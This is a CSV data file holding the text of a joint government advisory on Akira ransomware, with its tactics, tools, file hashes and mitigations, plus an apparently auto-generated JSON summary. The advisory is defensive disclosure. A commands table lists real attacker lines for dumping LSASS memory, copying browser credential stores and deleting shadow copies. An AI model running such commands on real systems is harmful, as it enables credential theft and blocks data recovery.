date,url,text,title,summary
04-18-2024,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa24-109a-stopransomware-akira-ransomware_2.pdf?alt=media&token=f30c3ddd-c0ff-4ade-8995-8cb0514a47aa," 
 
 
 
 
                                              
  
 
  
To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI 
field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available, please include the 
following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; 
type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. 
This document is marked TLP:CLEAR. Recipients may share this information without restriction. Information is subject to 
standard copyright rules. For more information on the Traffic Light Protocol, see cisa.gov/tlp. 
Product ID: AA24-109A 
 
April 18, 2024 
Co-Authored by: 
TLP:CLEAR 
TLP:CLEAR 
#StopRansomware: Akira Ransomware 
SUMMARY 
Note: This joint Cybersecurity Advisory (CSA) is part of 
an ongoing #StopRansomware effort to publish 
advisories for network defenders that detail various 
ransomware variants and ransomware threat actors. 
These #StopRansomware advisories include recently 
and historically observed tactics, techniques, and 
procedures (TTPs) and indicators of compromise (IOCs) 
to help organizations protect against ransomware. Visit 
stopransomware.gov to see all #StopRansomware 
advisories and to learn more about other ransomware 
threats and no-cost resources. 
The United States’ Federal Bureau of Investigation 
(FBI), Cybersecurity and Infrastructure Security Agency 
(CISA), Europol’s European Cybercrime Centre (EC3), and the Netherlands’ National Cyber Security 
Centre (NCSC-NL) are releasing this joint CSA to disseminate known Akira ransomware IOCs and 
TTPs identified through FBI investigations as recently as February 2024 and trusted third party 
reporting. 
Since March 2023, Akira ransomware has impacted a wide range of businesses and critical 
infrastructure entities in North America, Europe, and Australia. In April 2023, following an initial focus 
on Windows systems, Akira threat actors deployed a Linux variant targeting VMware ESXi virtual 
machines. As of January 1, 2024, the ransomware group has impacted over 250 organizations and 
claimed approximately $42 million USD in ransomware proceeds. 
Early versions of the Akira ransomware variant were written in C++ and encrypted files with a .akira 
extension; however, beginning in August 2023, some Akira attacks began deploying Megazord, using 
Rust-based code which encrypts files with a .powerranges extension. Akira threat actors have 
continued to use both Megazord and Akira, including Akira_v2 (identified by trusted third party 
investigations) interchangeably. 
Actions to take today to mitigate cyber 
threats from Akira ransomware: 
• 
Prioritize remediating known exploited 
vulnerabilities. 
• 
Enable multifactor authentication (MFA) 
for all services to the extent possible, 
particularly for webmail, VPN, and 
accounts that access critical systems. 
• 
Regularly patch and update software and 
applications to their latest version and 
conduct regular vulnerability 
assessments. 
 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 2 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
The FBI, CISA, EC3, and NCSC-NL encourage organizations to implement the recommendations in 
the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. 
For a downloadable copy of IOCs, see: 
• 
AA24-109A (STIX XML, 82KB) 
• 
AA24-109A (STIX JSON, 55KB) 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See MITRE 
ATT&CK for Enterprise for all referenced tactics and techniques. 
Initial Access 
The FBI and cybersecurity researchers have observed Akira threat actors obtaining initial access to 
organizations through a virtual private network (VPN) service without multifactor authentication (MFA) 
configured[1], mostly using known Cisco vulnerabilities [T1190] CVE-2020-3259 and CVE-2023-
20269.[2],[3],[4] Additional methods of initial access include the use of external-facing services such 
as Remote Desktop Protocol (RDP) [T1133], spear phishing [T1566.001][T1566.002], and the abuse 
of valid credentials [T1078].[4] 
Persistence and Discovery 
Once initial access is obtained, Akira threat actors attempt to abuse the functions of domain 
controllers by creating new domain accounts [T1136.002] to establish persistence. In some instances, 
the FBI identified Akira threat actors creating an administrative account named itadm. 
According to FBI and open source reporting, Akira threat actors leverage post-exploitation attack 
techniques, such as Kerberoasting[5], to extract credentials stored in the process memory of the 
Local Security Authority Subsystem Service (LSASS) [T1003.001].[6] Akira threat actors also use 
credential scraping tools [T1003] like Mimikatz and LaZagne to aid in privilege escalation. Tools like 
SoftPerfect and Advanced IP Scanner are often used for network device discovery (reconnaissance) 
purposes [T1016] and net Windows commands are used to identify domain controllers [T1018] and 
gather information on domain trust relationships [T1482]. 
See Table 1 for a descriptive listing of these tools. 
Defense Evasion 
Based on trusted third party investigations, Akira threat actors have been observed deploying two 
distinct ransomware variants against different system architectures within the same compromise 
event. This marks a shift from recently reported Akira affiliate activity. Akira threat actors were first 
observed deploying the Windows-specific “Megazord” ransomware, with further analysis revealing 
that a second payload was concurrently deployed in this attack (which was later identified as a novel 
variant of the Akira ESXi encryptor, “Akira_v2”). 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 3 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
As Akira threat actors prepare for lateral movement, they commonly disable security software to avoid 
detection. Cybersecurity researchers have observed Akira threat actors using PowerTool to exploit 
the Zemana AntiMalware driver[4] and terminate antivirus-related processes [T1562.001]. 
Exfiltration and Impact 
Akira threat actors leverage tools such as FileZilla, WinRAR [T1560.001], WinSCP, and RClone to 
exfiltrate data [T1048]. To establish command and control channels, threat actors leverage readily 
available tools like AnyDesk, MobaXterm, RustDesk, Ngrok, and Cloudflare Tunnel, enabling 
exfiltration through various protocols such as File Transfer Protocol (FTP), Secure File Transfer 
Protocol (SFTP), and cloud storage services like Mega [T1537] to connect to exfiltration servers. 
Akira threat actors use a double-extortion model [T1657] and encrypt systems [T1486] after 
exfiltrating data. The Akira ransom note provides each company with a unique code and instructions 
to contact the threat actors via a .onion URL. Akira threat actors do not leave an initial ransom 
demand or payment instructions on compromised networks, and do not relay this information until 
contacted by the victim. Ransom payments are paid in Bitcoin to cryptocurrency wallet addresses 
provided by the threat actors. To further apply pressure, Akira threat actors threaten to publish 
exfiltrated data on the Tor network, and in some instances have called victimized companies, 
according to FBI reporting. 
Encryption 
Akira threat actors utilize a sophisticated hybrid encryption scheme to lock data. This involves 
combining a ChaCha20 stream cipher with an RSA public-key cryptosystem for speed and secure key 
exchange [T1486]. This multilayered approach tailors encryption methods based on file type and size 
and is capable of full or partial encryption. Encrypted files are appended with either a .akira or 
.powerranges extension. To further inhibit system recovery, Akira’s encryptor (w.exe) utilizes 
PowerShell commands to delete volume shadow copies (VSS) on Windows systems [T1490]. 
Additionally, a ransom note named fn.txt appears in both the root directory (C:) and each users’ 
home directory (C:\Users). 
Trusted third party analysis identified that the Akira_v2 encryptor is an upgrade from its previous 
version, which includes additional functionalities due to the language it’s written in (Rust). Previous 
versions of the encryptor provided options to include arguments at runtime, which included: 
• 
-p --encryption_path (targeted file/folder paths) 
• 
-s --share_file (targeted network drive path) 
• 
-n --encryption_percent (percentage of encryption) 
• 
--fork (create a child process for encryption 
The additional inclusion of threads allows the actor to have more granular control over the number of 
CPU cores in use, increasing the speed and efficiency of the encryption process. The new version 
also adds a layer of protection, utilizing the Build ID as a run condition, to hinder dynamic analysis. 
The encryptor is unable to execute successfully without the specific unique Build ID. The ability to 
deploy against only virtual machines using “vmonly” and the ability to stop running virtual machines 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 4 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
with “stopvm” functionalities have also been observed implemented for Akira_v2. After encryption, the 
Linux ESXi variant may include the file extension “akiranew” or an added file named “akiranew.txt” 
as a ransom note in directories where files were encrypted with the new nomenclature. 
Leveraged Tools 
Table 1 lists publicly available tools and applications Akira threat actors have used, including 
legitimate tools repurposed for their operations. Use of these tools and applications should not be 
attributed as malicious without analytical evidence to support threat actor use and/or control. 
Table 1: Tools Leveraged by Akira Ransomware Actors 
Name 
Description 
AdFind 
AdFind.exe is used to query and retrieve information from Active Directory. 
Advanced IP 
Scanner 
A network scanner is used to locate all the computers on a network and conduct a 
scan of their ports. The program shows all network devices, gives access to 
shared folders, and provides remote control of computers (via RDP and Radmin). 
AnyDesk 
A common software that can be maliciously used by threat actors to obtain remote 
access and maintain persistence [T1219]. AnyDesk also supports remote file 
transfer. 
LaZagne 
Allows users to recover stored passwords on Windows, Linux, and OSX systems. 
PCHunter64 
A tool used to acquire detailed process and system information [T1082].[7] 
PowerShell 
A cross-platform task automation solution made up of a command line shell, a 
scripting language, and a configuration management framework, which runs on 
Windows, Linux, and macOS. 
Mimikatz 
Allows users to view and save authentication credentials such as Kerberos tickets. 
Ngrok 
A reverse proxy tool [T1090] used to create a secure tunnel to servers behind 
firewalls or local machines without a public IP address. 
RClone 
A command line program used to sync files with cloud storage services 
[T1567.002] such as Mega. 
SoftPerfect 
A network scanner (netscan.exe) used to ping computers, scan ports, discover 
shared folders, and retrieve information about network devices via Windows 
Management Instrumentation (WMI), Simple Network Management Protocol 
(SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote 
services, registry, files, and performance counters. 
WinRAR 
Used to split compromised data into segments and to compress [T1560.001] files 
into .RAR format for exfiltration. 
WinSCP 
Windows Secure Copy is a free and open source SSH File Transfer Protocol, File 
Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Akira 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 5 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
Indicators of Compromise 
Disclaimer: Investigation or vetting of these indicators is recommended prior to taking action, such as 
blocking. 
Table 2: Malicious Files Affiliated with Akira Ransomware 
Name 
Description 
threat actors have used it to transfer data [T1048] from a compromised network to 
actor-controlled accounts. 
File Name 
Hash (SHA-256) 
Description 
w.exe 
d2fd0654710c27dcf37b6c1437880020
824e161dd0bf28e3a133ed777242a0c
a 
Akira ransomware 
Win.exe 
dcfa2800754e5722acf94987bb03e814
edcb9acebda37df6da1987bf48e5b05e 
Akira ransomware encryptor 
AnyDesk.exe 
bc747e3bf7b6e02c09f3d18bdd0e64ee
f62b940b2f16c9c72e647eec85cf0138 
Remote desktop application 
Gcapi.dll 
73170761d6776c0debacfbbc61b6988c
b8270a20174bf5c049768a264bb8ffaf 
DLL file that assists with the execution 
of AnyDesk.exe 
Sysmon.exe 
1b60097bf1ccb15a952e5bcc3522cf5c
162da68c381a76abc2d5985659e4d38
6 
Ngrok tool for persistence 
Config.yml 
Varies by use 
Ngrok configuration file 
Rclone.exe 
aaa647327ba5b855bedea8e889b3fafd
c05a6ca75d1cfd98869432006d6fecc9 
Exfiltration tool 
Winscp.rnd 
7d6959bb7a9482e1caa83b16ee01103
d982d47c70c72fdd03708e2b7f4c552c
4 
Network file transfer program 
WinSCP-6.1.2-
Setup.exe 
36cc31f0ab65b745f25c7e785df9e72d1
c8919d35a1d7bd4ce8050c8c068b13c 
Network file transfer program 
Akira_v2 
3298d203c2acb68c474e5fdad8379181
890b4403d6491c523c13730129be3f7
5 
0ee1d284ed663073872012c7bde7fac
5ca1121403f1a5d2d5411317df282796
c 
Akira_v2 ransomware 
Megazord 
ffd9f58e5fe8502249c67cad0123ceeea
a6e9f69b4ec9f9e21511809849eb8fc 
Akira “Megazord” ransomware 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 6 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
 
 
File Name 
Hash (SHA-256) 
Description 
dfe6fddc67bdc93b9947430b966da287
7fda094edf3e21e6f0ba98a84bc53198 
131da83b521f610819141d5c740313c
e46578374abb22ef504a7593955a65f0
7 
9f393516edf6b8e011df6ee991758480
c5b99a0efbfd68347786061f0e04426c 
9585af44c3ff8fd921c713680b0c2b3bb
c9d56add848ed62164f7c9b9f23d065 
2f629395fdfa11e713ea8bf11d40f6f240
acf2f5fcf9a2ac50b6f7fbc7521c83 
7f731cc11f8e4d249142e99a44b9da7a
48505ce32c4ee4881041beeddb3760b
e 
95477703e789e6182096a09bc98853e
0a70b680a4f19fa2bf86cbb9280e8ec5
a 
0c0e0f9b09b80d87ebc88e2870907b6c
acb4cd7703584baf8f2be1fd9438696d 
C9c94ac5e1991a7db42c7973e328fce
eb6f163d9f644031bdfd4123c7b3898b
0 
VeeamHax.exe 
aaa6041912a6ba3cf167ecdb90a434a
62feaf08639c59705847706b9f492015
d 
Plaintext credential leaking tool 
Veeam-Get-
Creds.ps1 
18051333e658c4816ff3576a2e9d97fe
2a1196ac0ea5ed9ba386c46defafdb88 
PowerShell script for obtaining and 
decrypting accounts from Veeam 
servers 
PowershellKer
beros 
TicketDumper 
5e1e3bf6999126ae4aa52146280fdb91
3912632e8bac4f54e98c58821a307d3
2 
Kerberos ticket dumping tool from LSA 
cache 
sshd.exe 
8317ff6416af8ab6eb35df3529689671a
700fdb61a5e6436f4d6ea8ee002d694 
OpenSSH Backdoor 
ipscan-3.9.1-
setup.exe 
892405573aa34dfc49b37e4c35b6555
43e88ec1c5e8ffb27ab8d1bbf90fc6ae0 
Network scanner that scans IP 
addresses and ports 
File Name 
Hash (MD5) 
Description 
winrar-x64-
623.exe 
7a647af3c112ad805296a22b2a276e7
c 
Network file transfer program 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 7 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
Table 3: Windows Akira Ransomware Samples 
Disclaimer: While the date/time can be changed by Akira threat actors, trusted third-party analysis 
confirmed these samples were created on December 28, 2023. 
Hash (SHA-256) 
0b5b31af5956158bfbd14f6cbf4f1bca23c5d16a40dbf3758f3289146c565f43 
0d700ca5f6cc093de4abba9410480ee7a8870d5e8fe86c9ce103eec3872f225f 
a2df5477cf924bd41241a3326060cc2f913aff2379858b148ddec455e4da67bc 
03aa12ac2884251aa24bf0ccd854047de403591a8537e6aba19e822807e06a45 
2e88e55cc8ee364bf90e7a51671366efb3dac3e9468005b044164ba0f1624422 
40221e1c2e0c09bc6104548ee847b6ec790413d6ece06ad675fff87e5b8dc1d5 
5ea65e2bb9d245913ad69ce90e3bd9647eb16d992301145372565486c77568a2 
643061ac0b51f8c77f2ed202dc91afb9879f796ddd974489209d45f84f644562 
6f9d50bab16b2532f4683eeb76bd25449d83bdd6c85bf0b05f716a4b49584f84 
fef09b0aa37cbdb6a8f60a6bd8b473a7e5bffdc7fd2e952444f781574abccf64 
Table 4: Linux/Unix Akira Ransomware Executable and Linkable Format (ELF) Samples 
Hash (SHA-256) 
e1321a4b2b104f31aceaf4b19c5559e40ba35b73a754d3ae13d8e90c53146c0f 
74f497088b49b745e6377b32ed5d9dfaef3c84c7c0bb50fabf30363ad2e0bfb1 
3d2b58ef6df743ce58669d7387ff94740ceb0122c4fc1c4ffd81af00e72e60a4 
Table 5: Commands Affiliated with Akira Ransomware 
Persistence and Discovery 
nltest /dclist: [T1018] 
nltest /DOMAIN_TRUSTS [T1482] 
net group “Domain admins” /dom [T1069.002] 
net localgroup “Administrators” /dom [T1069.001] 
tasklist [T1057] 
rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) 
C:\windows\temp\lsass.dmp full [T1003.001] 
Credential Access 
cmd.exe /Q /c esentutl.exe /y 
""C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<firefox_profile_id>.default-
release\key4.db"" /d 
""C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<firefox_profile_id>.default-
release\key4.db.tmp” 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 8 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
MITRE ATT&CK TACTICS AND TECHNIQUES 
See Tables 6 -14 for all referenced Akira threat actor tactics and techniques for enterprise 
environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE 
ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping 
and CISA’s Decider Tool. 
Table 6: Initial Access 
Technique Title 
ID 
Use 
Valid Accounts 
T1078 
Akira threat actors obtain and abuse 
credentials of existing accounts as a 
means of gaining initial access. 
Exploit Public Facing Application 
T1190 
Akira threat actors exploit 
vulnerabilities in internet-facing 
systems to gain access to systems. 
External Remote Services 
T1133 
Akira threat actors have used remote 
access services, such as RDP/VPN 
connection to gain initial access. 
Phishing: Spearphishing 
Attachment  
T1566.001
 
Akira threat actors use phishing 
emails with malicious attachments to 
gain access to networks. 
Phishing: Spearphishing Link  
T1566.002 
Akira threat actors use phishing 
emails with malicious links to gain 
access to networks.  
Table 7: Credential Access 
Technique Title 
ID 
Use 
OS Credential Dumping 
T1003 
Akira threat actors use tools like 
Mimikatz and LaZagne to dump 
credentials. 
OS Credential Dumping: 
LSASS Memory 
T1003.001 
Akira threat actors attempt to access 
credential material stored in the 
process memory of the LSASS. 
Note: Used for accessing Firefox data. 
cmd.exe /Q /c esentutl.exe /y 
""C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data"" /d 
""C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data.tmp” 
Note: Used for accessing Google Chrome data. 
Impact 
powershell.exe -Command ""Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"" [T1490] 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 9 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
Table 8: Discovery 
Technique Title 
ID 
Use 
System Network Configuration 
Discovery  
T1016 
Akira threat actors use tools to scan 
systems and identify services running 
on remote hosts and local network 
infrastructure. 
System Information Discovery 
T1082 
Akira threat actors use tools like 
PCHunter64 to acquire detailed 
process and system information. 
Domain Trust Discovery 
T1482 
Akira threat actors use the net 
Windows command to enumerate 
domain information. 
Process Discovery 
T1057 
Akira threat actors use the Tasklist 
utility to obtain details on running 
processes via PowerShell. 
Permission Groups Discovery: 
Local Groups 
T1069.001 
Akira threat actors use the net 
localgroup /dom to find local system 
groups and permission settings.  
Permission Groups Discovery: 
Domain Groups  
T1069.002 
Akira threat actors use the net group 
/domain command to attempt to find 
domain level groups and permission 
settings. 
Remote System Discovery 
T1018 
Akira threat actors use nltest / 
dclist to amass a listing of other 
systems by IP address, hostname, or 
other logical identifiers on a network. 
Table 9: Persistence 
Technique Title 
ID 
Use 
Create Account: Domain 
Account 
T1136.002 
Akira threat actors attempt to abuse 
the functions of domain controllers by 
creating new domain accounts to 
establish persistence. 
Table 10: Defense Evasion 
Technique Title 
ID 
Use 
Impair Defenses: Disable or 
Modify Tools 
T1562.001
 
Akira threat actors use BYOVD 
attacks to disable antivirus software. 
 
 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 10 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
Table 11: Command and Control 
Technique Title 
ID 
Use 
Remote Access Software 
T1219 
Akira threat actors use legitimate 
desktop support software like 
AnyDesk to obtain remote access to 
victim systems. 
Proxy 
T1090 
Akira threat actors utilized Ngrok to 
create a secure tunnel to servers that 
aided in exfiltration of data.  
Table 12: Collection 
Technique Title 
ID 
Use 
Archive Collected Data: 
Archive via Utility 
T1560.001
 
Akira threat actors use tools like 
WinRAR to compress files. 
Table 13: Exfiltration 
Technique Title 
ID 
Use 
Exfiltration Over Alternative 
Protocol 
T1048 
Akira threat actors use file transfer 
tools like WinSCP to transfer data. 
Transfer Data to Cloud Account 
T1537 
Akira threat actors use tools like 
CloudZilla to exfiltrate data to a cloud 
account and connect to exfil servers 
they control. 
Exfiltration Over Web Service: 
Exfiltration to Cloud Storage 
T1567.002 
Akira threat actors leveraged RClone 
to sync files with cloud storage 
services to exfiltrate data.  
Table 14: Impact 
Technique Title 
ID 
Use 
Date Encrypted for Impact 
T1486 
Akira threat actors encrypt data on 
target systems to interrupt availability 
to system and network resources. 
Inhibit System Recovery 
T1490 
Akira threat actors delete volume 
shadow copies on Windows systems. 
Financial Theft 
T1657 
Akira threat actors use a double-
extortion model for financial gain. 
 
 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 11 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
MITIGATIONS 
Network Defenders 
The FBI, CISA, EC3, and NCSC-NL recommend organizations apply the following mitigations to limit 
potential adversarial use of common system and network discovery techniques, and to reduce the risk 
of compromise by Akira ransomware. These mitigations align with the Cross-Sector Cybersecurity 
Performance Goals (CPGs) developed by CISA and the National Institute of Standards and 
Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and 
NIST recommend all organizations implement. CISA and NIST based the CPGs on existing 
cybersecurity frameworks and guidance to protect against the most common and impactful threats 
and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the 
CPGs, including additional recommended baseline protections. 
• 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary 
data and servers in a physically separate, segmented, and secure location (e.g., hard drive, 
storage device, the cloud) [CPG 2.F, 2.R, 2.S]. 
• 
Require all accounts with password logins (e.g., service accounts, admin accounts, and 
domain admin accounts) to comply with NIST’s standards. In particular, require employees to 
use long passwords and consider not requiring recurring password changes, as these can 
weaken security [CPG 2.C]. 
• 
Require multifactor authentication for all services to the extent possible, particularly for 
webmail, virtual private networks, and accounts that access critical systems [CPG 2.H]. 
• 
Keep all operating systems, software, and firmware up to date. Timely patching is one of 
the most efficient and cost effective steps an organization can take to minimize its exposure to 
cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing 
systems. [CPG 1.E]. 
• 
Segment networks to prevent the spread of ransomware. Network segmentation can help 
prevent the spread of ransomware by controlling traffic flows between—and access to—
various subnetworks and by restricting adversary lateral movement [CPG 2.F]. 
• 
Identify, detect, and investigate abnormal activity and potential traversal of the 
indicated ransomware with a networking monitoring tool. To aid in detecting the 
ransomware, implement a tool that logs and reports all network traffic, including lateral 
movement activity on a network. Endpoint detection and response (EDR) tools are particularly 
useful for detecting lateral connections as they have insight into common and uncommon 
network connections for each host [CPG 3.A]. 
• 
Filter network traffic by preventing unknown or untrusted origins from accessing remote 
services on internal systems. This prevents threat actors from directly connecting to remote 
access services that they have established for persistence. 
• 
Install, regularly update, and enable real time detection for antivirus software on all 
hosts. 
• 
Review domain controllers, servers, workstations, and active directories for new and/or 
unrecognized accounts [CPG 1.A, 2.O]. 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 12 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
• 
Audit user accounts with administrative privileges and configure access controls according 
to the principle of least privilege [CPG 2.E]. 
• 
Disable unused ports [CPG 2.V]. 
• 
Consider adding an email banner to emails received from outside of your organization 
[CPG 2.M]. 
• 
Disable hyperlinks in received emails. 
• 
Implement time-based access for accounts set at the admin level and higher. For 
example, the Just-in-Time (JIT) access method provisions privileged access when needed 
and can support enforcement of the principle of least privilege (as well as the Zero Trust 
model). This is a process where a network-wide policy is set in place to automatically disable 
admin accounts at the Active Directory level when the account is not in direct need. Individual 
users may submit their requests through an automated process that grants them access to a 
specified system for a set timeframe when they need to support the completion of a certain 
task. 
• 
Disable command-line and scripting activities and permissions. Privilege escalation and 
lateral movement often depend on software utilities running from the command line. If threat 
actors are not able to run these tools, they will have difficulty escalating privileges and/or 
moving laterally [CPG 2.E, 2.N]. 
• 
Maintain offline backups of data, and regularly maintain backup and restoration [CPG 2.R]. 
By instituting this practice, the organization helps ensure they will not be severely interrupted, 
and/or only have irretrievable data.  
• 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and 
covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R]. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, the FBI, CISA, EC3, and NCSC-NL recommend exercising, testing, 
and validating your organization’s security program against the threat behaviors mapped to the 
MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, EC3 and NCSC-NL 
recommend testing your existing security controls inventory to assess how they perform against the 
ATT&CK techniques described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Tables 6 -14). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 13 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
The FBI, CISA, EC3, and NCSC-NL recommend continually testing your security program, at scale, in 
a production environment to ensure optimal performance against the MITRE ATT&CK techniques 
identified in this advisory. 
RESOURCES 
• 
Stopransomware.gov is a whole-of-government approach that gives one central location for 
ransomware resources and alerts. 
• 
Resource to mitigate a ransomware attack: #StopRansomware Guide. 
• 
No cost cyber hygiene services: Cyber Hygiene Services, Ransomware Readiness 
Assessment. 
REFERENCES 
[1] Fortinet: Ransomware Roundup - Akira 
[2] Cisco: Akira Ransomware Targeting VPNs without MFA 
[3] Truesec: Indications of Akira Ransomware Group Actively Exploiting Cisco AnyConnect CVE-
2020-3259 
[4] TrendMicro: Akira Ransomware Spotlight 
[5] CrowdStrike: What is a Kerberoasting Attack? 
[6] Sophos: Akira, again: The ransomware that keeps on taking 
[7] Sophos: Akira Ransomware is “bringin’ 1988 back” 
REPORTING 
Your organization has no obligation to respond or provide information back to the FBI in response to 
this joint CSA. If, after reviewing the information provided, your organization decides to provide 
information to the FBI, reporting must be consistent with applicable state and federal laws. 
The FBI is interested in any information that can be shared, to include boundary logs showing 
communication to and from foreign IP addresses, a sample ransom note, communications with Akira 
threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. 
Additional details of interest include: a targeted company point of contact, status and scope of 
infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial 
attack vector, and host- and network-based indicators. 
The FBI, CISA, EC3, and NCSC-NL do not encourage paying ransom as payment does not 
guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to 
target additional organizations, encourage other criminal actors to engage in the distribution of 
ransomware, and/or fund illicit activities. Regardless of whether you or your organization have 
decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to 
the FBI’s Internet Crime Complain Center (IC3), a local FBI Field Office, or CISA via the agency’s 
Incident Reporting System or its 24/7 Operations Center (report@cisa.gov or (888) 282-0870). 
 
 
 
FBI | CISA | EC3 | NCSC-NL 
 
TLP:CLEAR 
 
Page 14 of 14  |  Product ID: AA24-109A 
 
TLP:CLEAR 
 
DISCLAIMER 
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, 
EC3, and NCSC-NL do not endorse any commercial entity, product, company, or service, including 
any entities, products, or services linked within this document. Any reference to specific commercial 
products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not 
constitute or imply endorsement, recommendation, or favoring by the FBI or CISA. 
ACKNOWLEDGEMENTS 
Cisco, Sophos, and Fortinet contributed to this advisory. 
VERSION HISTORY 
April 18, 2024: Initial version. 
",#StopRansomware: Akira Ransomware,"{
  ""ID"": ""AA24-109A"",
  ""URL"": ""https://cisa.gov/tlp"",
  ""Title"": ""#StopRansomware: Akira Ransomware"",
  ""Release Date"": ""2024-04-18"",
  ""Last Updated"": ""2024-04-18"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
	""Windows Systems"",
	""VMware ESXi Virtual Machines"",
	""Linux systems""
  ],
  ""Summary"": ""This joint Cybersecurity Advisory details the ongoing threat posed by Akira ransomware, identifying tactics, techniques, and procedures (TTPs) along with indicators of compromise (IOCs). It encourages the implementation of recommended mitigations to decrease the incidence and impact of ransomware attacks."",
  ""Procedures"": {
	""Initial System Compromise"": ""Akira ransomware deploys sophisticated methods to initially compromise systems through vulnerabilities in network services and user interactions such as phishing."",
	""Data Exfiltration and Encryption"": ""Following the initial compromise, Akira threat actors exfiltrate sensitive data and subsequently deploy ransomware to encrypt files on affected systems.""
  },
  ""Tactics"": {
	""Initial Access"": ""Gaining entry into networks via exposed or weakly secured services. Techniques include exploiting VPN vulnerabilities and phishing."",
	""Establishment of Persistence"": ""Creating new user accounts and deploying remote access tools ensure continued access."",
	""Execution of Ransomware"": ""Attackers utilize dual forms of ransomware to cripple systems, demanding ransom for decryption keys.""
  },
  ""Techniques"": {
	""Exploitation of Known Vulnerabilities"": ""Utilizing known security flaws, particularly in Cisco systems, to gain unauthorized access."",
	""Use of Credential Harvesting Tools"": ""Employment of tools like Mimikatz to capture valid user credentials to facilitate lateral movement across networks."",
	""Double Extortion Ransomware Deployment"": ""Threat actors execute ransomware like 'Megazord' and 'Akira_v2', followed by threats to leak encrypted data unless a ransom is paid.""
  },
  ""Threat Actions"": [
	""Exfiltration of confidential data using tools such as FileZilla and WinSCP."",
	""Deployment of advanced ransomware variants resulting in extensive system encryption and significant data loss."",
	""Intimidation and coercion of affected entities through threat of data exposure.""
  ],
  ""Indicators of Compromise"": {
	""IPs"": [
		""Not specified in the advisory""
	],
	""Domains"": [
		""Not specified in the advisory""
	],
	""Hashes"": [
		""d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca"",
		""dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e""
	]
  },
  ""Mitigation Strategies"": ""The advisory includes a comprehensive list of mitigations such as prioritizing the remediation of known exploited vulnerabilities, enabling multifactor authentication, and implementing network segmentation to limit ransomware spread."",
  ""References"": [
	""https://stopransomware.gov"",
	""https://www.cisa.gov/tlp""
  ]
}"
02-29-2024,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2FAA24-060B-Threat-Actors-Exploit-Multiple-Vulnerabilities-in-Ivanti-Connect-Secure-and-Policy-Secure-Gateways_0.pdf?alt=media&token=d94153bf-322f-4b00-8935-a957667406ba,"  
 
 
 
 
 
 
 
 
 
  
 
